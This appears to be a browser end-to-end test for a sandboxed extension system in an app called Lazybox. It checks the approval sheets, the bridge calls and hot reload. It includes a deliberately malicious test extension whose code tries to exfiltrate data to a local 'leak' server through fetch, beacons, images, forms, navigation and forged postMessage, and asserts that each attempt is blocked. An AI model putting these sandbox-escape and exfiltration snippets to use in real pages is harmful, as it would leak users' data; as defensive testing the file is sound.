// Fixture only: sandboxed panel extensions (EXTENSIONS.md). From an empty
// Extensions panel, the person adds the Agent board example, reads exactly
// what it may do in the approval sheet and allows it; the board renders in its
// sandboxed frame with the theme's tokens, reads what needs the person, shows
// a conversation and opens the inbox through the bridge; a call outside its
// grants is refused and said quietly in the panel; saving one of its files
// reloads it. A malicious extension cannot reach Lazybox's document or
// storage, navigate the window, open a popup, submit a form, run inline code,
// reach a host that was not approved (by fetch, image or navigating its own
// frame), or pass for the panel's shell; a host that was approved works.
// Settings → Extensions turns it off. Screenshots dark and light:
// .cache/extensions-*.png. WebKit, the browser build, the fake Runner; the
// content origin and its policies are real (policy.json), the Runner's parser
// and credential checks are the Go tests'.
import { testViteCache } from './fixtures/vite-cache.mjs';
import { createServer } from 'vite';
import { createServer as createHttp } from 'node:http';
import react from '@vitejs/plugin-react';
import { webkit, expect } from './fixtures/playwright.mjs';
import { fileURLToPath } from 'node:url';
import { mkdir } from 'node:fs/promises';
import assert from 'node:assert/strict';
import { startRunnerFixture } from './fixtures/runner-ui.mjs';
import { collectPageErrors } from './fixtures/page-errors.mjs';

const listen = handler => new Promise(resolve => { const s = createHttp(handler); s.listen(0, '127.0.0.1', () => resolve(s)); });
// Where a malicious extension would send what it read: nothing may arrive.
const leaks = [];
const leak = await listen((req, res) => { leaks.push(req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/html' }); res.end('<h1>leaked</h1>'); });
const approved = await listen((req, res) => { res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' }); res.end('{"ok":true}'); });
const LEAK = `http://127.0.0.1:${leak.address().port}`, APPROVED = `http://127.0.0.1:${approved.address().port}`;

const f = await startRunnerFixture();
// Something needs the person: a question waiting in Beta.
Object.assign(f.sessions.find(s => s.id === 'beta-session'), { title: 'Pick the database', status: 'waiting_input', pending: [{ type: 'question', requestId: 'q-db', text: 'Postgres or SQLite?' }] });
Object.assign(f.sessions.find(s => s.id === 'alpha-session'), { title: 'Fix the parser' });
const server = await createServer({ ...testViteCache(import.meta.url), configFile: false, logLevel: 'error', root: fileURLToPath(new URL('../apps/web', import.meta.url)), plugins: [react()], server: { host: '127.0.0.1', port: 0, proxy: { '/lazybox.bench.v1.RunnerService/': { target: f.url } } } });
await server.listen(); await mkdir('.cache', { recursive: true });
const url = `http://127.0.0.1:${server.httpServer.address().port}/?view=workspace&collection=alpha&session=alpha-session#token=${f.token}`;

// Its script runs once the page is parsed (defer, as the examples do): lazybox.ready can answer before
// the parser reaches <body> on a slow machine, and #out would not exist yet.
await f.extensions.addFolder('mischief', {
  'extension.yaml': `lazybox: 1\nname: Mischief\nversion: 0.0.1\ndescription: A test extension that tries what it must not.\npanels:\n  - id: main\n    title: Mischief\n    entry: index.html\ngrants:\n  - read:sessions\nnetwork:\n  - ${APPROVED}\n`,
  'index.html': `<!doctype html><html><head><meta charset="utf-8"><title>Mischief</title><link rel="stylesheet" href="_lazybox/lazybox.css"><script src="_lazybox/lazybox.js"></script><script>window.inlineRan = true;</script><style>body { outline: 9px solid red; }</style><script src="app.js" defer></script></head><body><h1>Mischief</h1><p id="out">…</p><form id="form" action="${LEAK}/form" method="post"><input name="q" value="secret"></form></body></html>`,
  'app.js': `window.appRan = true; lazybox.ready.then(info => { document.getElementById('out').textContent = 'hello ' + info.grants.join(','); });`,
});

const shellOf = page => page.frames().find(frame => frame.url().includes('/_lazybox/shell.html'));
const innerOf = (page, name = 'index.html') => page.frames().find(frame => frame.parentFrame() && frame.parentFrame().url().includes('/_lazybox/shell.html') && frame.url().endsWith(name));
async function inner(page, name) { let frame; await expect.poll(() => { frame = innerOf(page, name); return !!frame; }, { timeout: 8000 }).toBe(true); return frame; }

async function scenario(browser, scheme, full) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: scheme });
  const page = await context.newPage();
  page.setDefaultTimeout(10000);
  const errors = []; await collectPageErrors(page, errors);
  const shot = name => page.screenshot({ path: `.cache/extensions-${name}-${scheme}.png` });
  await page.goto(url);
  await expect(page.locator('.page-layout .panel-chat').getByRole('textbox', { name: 'Message', exact: true })).toBeEnabled();

  // ---- An empty Extensions panel: the examples, one click to add.
  await page.locator('summary[aria-label="Panels"]').click();
  await page.getByRole('button', { name: 'New Extensions panel', exact: true }).click();
  const panel = page.locator('.extension-home, .extension-panel').first();
  if (full) {
    await expect(panel.getByRole('heading', { name: 'Examples' })).toBeVisible();
    await expect(panel.getByText('Agent board', { exact: true })).toBeVisible();
    await expect(panel.getByText('Mischief', { exact: true })).toBeVisible(); // waiting for approval
    await shot('home');
    await panel.locator('li', { hasText: 'Agent board' }).getByRole('button', { name: 'Add' }).click();
  } else {
    // Approved already (the Runner keeps it): show the board, from the panel's own picker if it shows another.
    const picker = page.getByRole('combobox', { name: 'Extension panel' });
    if (await picker.count()) await picker.selectOption({ label: 'Agent board' });
    else await panel.locator('.extension-tile', { hasText: 'Agent board' }).click();
  }

  // ---- The approval sheet: exactly what it may do, in words.
  const sheet = page.getByRole('dialog', { name: 'Allow Agent board?' });
  if (full) {
    await expect(sheet).toBeVisible();
    const can = sheet.getByRole('list', { name: 'What it can do' });
    await expect(can.locator('li')).toHaveCount(4);
    for (const text of ['See what needs you', 'Show a conversation', 'Run “Next conversation that needs you”', 'Run “Open the inbox”']) await expect(can).toContainText(text);
    await expect(sheet).toContainText('Nothing: it cannot use the network.');
    await expect(sheet.getByRole('button', { name: 'Not now' })).toBeFocused();
    await shot('approval');
    await sheet.getByRole('button', { name: 'Allow and turn on' }).click();
    await expect(sheet).toHaveCount(0);
    assert.deepEqual(f.mutations.filter(m => m.method === 'ApproveExtension').at(-1).body, { id: 'agent-board', grants: ['read:attention', 'show:conversations', 'do:attention.next', 'do:inbox.open'] });
  }

  // ---- The board renders, sandboxed, with the theme's tokens, and reads what needs you.
  const frameEl = page.locator('iframe.extension-frame');
  await expect(frameEl).toHaveAttribute('sandbox', 'allow-scripts');
  const board = page.frameLocator('iframe.extension-frame').frameLocator('iframe');
  await expect(board.getByRole('region', { name: 'Needs you' }).getByRole('button', { name: /Pick the database/ })).toBeVisible();
  await expect(board.getByRole('heading', { name: /1 need you/ })).toBeVisible();
  const boardFrame = await inner(page);
  const surface = await page.evaluate(() => getComputedStyle(document.querySelector('.extension-panel')).backgroundColor);
  await expect.poll(() => boardFrame.evaluate(() => getComputedStyle(document.body).backgroundColor)).toBe(surface);
  assert.equal(await boardFrame.evaluate(() => document.documentElement.dataset.scheme), scheme);
  await shot('board');

  if (full) {
    // ---- Through the bridge: show a conversation; open the inbox.
    await f.power.waitForWindow();
    // (A conversation of this workspace: showing one elsewhere moves to that workspace's page.)
    await board.getByRole('button', { name: /Fix the parser/ }).click();
    await expect.poll(() => [...f.power.requests.values()].some(r => r.request.kind === 'open' && r.request.sessionId === 'alpha-session' && r.request.state === 'done')).toBe(true);
    await board.getByRole('button', { name: 'Inbox' }).click();
    await expect.poll(() => [...f.power.requests.values()].some(r => r.request.kind === 'do' && r.request.actionId === 'inbox.open' && r.request.state === 'done')).toBe(true);
    await page.keyboard.press('Escape');

    // ---- A call outside its grants: refused, said once, quietly, with the way to review.
    const refused = await (await inner(page)).evaluate(() => lazybox.messages.send('alpha-session', 'from the board').then(() => 'sent', e => `${e.name}:${e.code}:${e.grant}`));
    assert.equal(refused, 'LazyboxError:not-granted:send:messages');
    const notice = page.locator('.extension-notice').filter({ hasText: 'asked to send messages as you' });
    await expect(notice).toBeVisible();
    await expect(notice.getByRole('button', { name: 'Review access' })).toBeVisible();
    assert.equal(f.calls.some(c => c.method === 'Apply' && c.extension), false, 'no message reached the Runner');
    await shot('refused');
    await notice.getByRole('button', { name: 'Dismiss' }).click();
    // The Runner's own check, past the bridge: the credential reaches nothing else.
    const credential = [...f.extensions.creds.keys()].at(-1);
    for (const method of ['GetSession', 'Apply', 'ListExtensions', 'ApproveExtension', 'ReadCommand']) {
      const r = await fetch(`${f.url}/lazybox.bench.v1.RunnerService/${method}`, { method: 'POST', headers: { authorization: `Bearer ${credential}`, 'content-type': 'application/json' }, body: '{"sessionId":"alpha-session","operationId":"x","message":{"text":"hi"}}' });
      assert.equal(r.status, 403, method);
    }

    // ---- Hot reload: a save in an editor reloads the panel.
    await (await inner(page)).evaluate(() => { window.__before = true; });
    await f.extensions.writeFile('agent-board', 'board.css', (await import('node:fs')).readFileSync(fileURLToPath(new URL('../services/runner/code/internal/power/extensions/examples/agent-board/board.css', import.meta.url)), 'utf8') + '\n.bar h1 { letter-spacing: .02em; }\n');
    await expect.poll(async () => { const frame = innerOf(page); return frame ? frame.evaluate(() => window.__before === undefined && !!document.querySelector('.column')).catch(() => false) : false; }, { timeout: 8000 }).toBe(true);

    // ---- A malicious extension: approved for one host and read:sessions only.
    await page.getByRole('combobox', { name: 'Extension panel' }).selectOption({ label: 'All extensions…' });
    await page.locator('.extension-home li', { hasText: 'Mischief' }).getByRole('button', { name: 'Review and turn on' }).click();
    const mischiefSheet = page.getByRole('dialog', { name: 'Allow Mischief?' });
    await expect(mischiefSheet.getByRole('list', { name: 'Where it can connect' })).toContainText('A service on this computer');
    await expect(mischiefSheet).toContainText('What it can see, it could send to these sites.');
    await shot('approval-network');
    await mischiefSheet.getByRole('button', { name: 'Allow and turn on' }).click();
    const mischief = page.frameLocator('iframe.extension-frame').frameLocator('iframe');
    await expect(mischief.getByText('hello read:sessions')).toBeVisible();
    const evil = await inner(page);
    const results = await evil.evaluate(async ({ LEAK, APPROVED }) => {
      const r = {};
      const attempt = async (name, fn) => { try { r[name] = `allowed:${await fn()}`; } catch (e) { r[name] = `blocked:${e.name}`; } };
      r.inline = window.inlineRan === true ? 'ran' : 'blocked';
      r.inlineStyle = getComputedStyle(document.body).outlineStyle === 'solid' ? 'applied' : 'blocked';
      await attempt('parentDocument', () => parent.document.title);
      await attempt('topDocument', () => top.document.title);
      await attempt('localStorage', () => localStorage.length);
      await attempt('cookie', () => { document.cookie = 'a=1'; return document.cookie; });
      await attempt('topNavigation', () => { top.location.href = LEAK + '/top'; return 'set'; });
      r.popup = String(window.open(LEAK + '/popup'));
      await attempt('fetchLeak', () => fetch(LEAK + '/fetch').then(x => x.status));
      await attempt('fetchApproved', () => fetch(APPROVED + '/ok').then(x => x.json()).then(x => x.ok));
      await attempt('beacon', () => navigator.sendBeacon(LEAK + '/beacon', 'x'));
      await attempt('image', () => new Promise((resolve, reject) => { const img = new Image(); img.onload = () => resolve('loaded'); img.onerror = () => reject(Object.assign(new Error('x'), { name: 'Blocked' })); img.src = LEAK + '/img'; }));
      await attempt('importLeak', () => import(LEAK + '/module.js'));
      await attempt('form', () => { document.getElementById('form').submit(); return 'submitted'; });
      await attempt('sessions', () => lazybox.sessions.list().then(x => x.conversations.length));
      await attempt('send', () => lazybox.messages.send('alpha-session', 'leak'));
      // Pass for the shell, or post straight to the app: ignored.
      top.postMessage({ lazybox: 1, from: 'shell', event: 'blocked', data: { uri: 'forged' } }, '*');
      top.postMessage({ lazybox: 1, id: 'forged', method: 'messages.send', params: { sessionId: 'alpha-session', text: 'forged' } }, '*');
      parent.postMessage({ lazybox: 1, id: 'forged2', method: 'messages.send', params: { sessionId: 'alpha-session', text: 'forged' } }, '*');
      return r;
    }, { LEAK, APPROVED });
    assert.equal(results.inline, 'blocked', 'an inline script ran');
    assert.equal(results.inlineStyle, 'blocked', 'an inline style applied');
    for (const name of ['parentDocument', 'topDocument', 'localStorage', 'cookie', 'topNavigation', 'fetchLeak', 'image', 'importLeak', 'send']) assert.match(results[name], /^blocked:/, `${name}: ${results[name]}`);
    assert.equal(results.popup, 'null');
    assert.equal(results.fetchApproved, 'allowed:true');
    assert.equal(results.sessions.startsWith('allowed:'), true, results.sessions);
    // sendBeacon only queues (it may answer true); the leak server below says whether anything left.
    assert.equal(page.url(), url, 'the window was navigated');
    await expect(page.locator('.extension-notice').filter({ hasText: 'forged' })).toHaveCount(0);
    // Nothing the screenshots or the page injected is reported as the extension leaving.
    await expect(page.locator('.extension-notice').filter({ hasText: 'tried to leave' })).toHaveCount(0);
    // Leaving its page for another site: blocked by the shell, and said.
    await evil.evaluate(LEAK => { location.href = LEAK + '/navigate?secret=1'; }, LEAK);
    await expect(page.locator('.extension-notice').filter({ hasText: `tried to leave its panel for ${LEAK}` })).toBeVisible();
    await page.waitForTimeout(500);
    assert.deepEqual(leaks, [], `requests reached the leak server: ${leaks}`);
    assert.equal(f.calls.some(c => c.method === 'Apply'), false, 'a forged message reached the Runner');
    await shot('blocked');

    // ---- Settings → Extensions: the list, and turning one off.
    await page.keyboard.press('Meta+,');
    await page.getByRole('tab', { name: 'Extensions' }).click();
    const card = page.getByRole('listitem', { name: 'Mischief' });
    await expect(card).toContainText('On');
    await expect(page.getByRole('listitem', { name: 'Agent board' })).toContainText('See what needs you');
    await shot('settings');
    await card.getByRole('switch').click();
    await expect(card.getByRole('switch')).not.toBeChecked();
    await expect(card).toContainText('Off');
    assert.deepEqual(f.mutations.filter(m => m.method === 'SetExtensionEnabled').at(-1).body, { id: 'mischief' });
  }
  if (!full) {
    // What an approved extension may do, from its panel; then Settings.
    await page.getByRole('button', { name: 'What Agent board may do' }).click();
    const access = page.getByRole('dialog', { name: 'What Agent board may do' });
    await expect(access.getByRole('button', { name: 'Done' })).toBeFocused();
    await shot('access');
    await access.getByRole('button', { name: 'Done' }).click();
    const extensions = page.getByRole('navigation', { name: 'Pages' }).getByRole('button', { name: 'Extensions', exact: true });
    await extensions.click();
    await expect(extensions).toHaveAttribute('aria-current', 'page');
    await expect(page.getByRole('listitem', { name: 'Mischief' })).toContainText('Off');
    await expect(page.getByRole('listitem', { name: 'Mischief' }).getByRole('button', { name: /^Open / })).toHaveCount(0);
    await page.getByRole('button', { name: 'Browse panels' }).click();
    await page.getByRole('button', { name: 'Manage extensions', exact: true }).click();
    await expect(extensions).toHaveAttribute('aria-current', 'page');
    await page.getByRole('listitem', { name: 'Agent board' }).getByRole('button', { name: 'Open Agent board' }).click();
    await expect(page.locator('iframe[title="Agent board (extension)"]')).toBeVisible();
    await page.keyboard.press('Meta+k');
    const palette = page.getByRole('dialog', { name: 'Command palette' });
    await palette.getByRole('combobox', { name: 'Search commands' }).fill('plugins');
    await palette.getByRole('option', { name: /Extensions settings/ }).click();
    await expect(extensions).toHaveAttribute('aria-current', 'page');
    await shot('settings');
  }
  // WebKit reports the malicious frame's refused top navigation on the page; nothing else may fail.
  assert.deepEqual(errors.filter(e => !/Unsafe JavaScript attempt to initiate navigation .* from frame with URL 'http:\/\/127\.0\.0\.1:\d+\/x\//.test(e)), []);
  await context.close();
}

let browser;
try {
  browser = await webkit.launch();
  await scenario(browser, 'dark', true);
  await scenario(browser, 'light', false);
  console.log('extensions: ok');
} finally {
  await browser?.close();
  await server.close();
  await f.close();
  leak.close(); approved.close();
}
